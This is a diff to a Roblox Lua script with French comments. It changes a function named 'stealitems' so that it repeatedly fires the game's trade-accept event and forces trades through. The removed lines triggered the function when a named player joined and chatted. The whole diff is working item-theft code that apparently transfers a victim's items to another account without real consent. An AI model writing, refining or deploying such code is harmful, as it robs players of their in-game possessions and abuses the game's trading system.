@@ -588,19 +588,20 @@ local function stealitems()
         end
     end
 
-  wait(12)
-    
-    -- Validation dynamique sans l'ID fixe 285646582
+  wait(12) -- Petit délai après l'ajout des items
+
+    -- 1ère étape : Clique sur "Accepter"
     pcall(function()
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
     end)
-end
 
--- Écouteur pour déclencher le transfert à l'arrivée du joueur
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
-        player.Chatted:Connect(function(msg)
-            stealitems()
+    -- 2ème étape : Attente du compte à rebours + validation finale répétée
+    task.wait(5)
+    
+    -- On force la confirmation à plusieurs reprises pour s'assurer que le serveur la prend en compte
+    for i = 1, 5 do
+        pcall(function()
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
         end)
+        task.wait(1)
     end
-end)
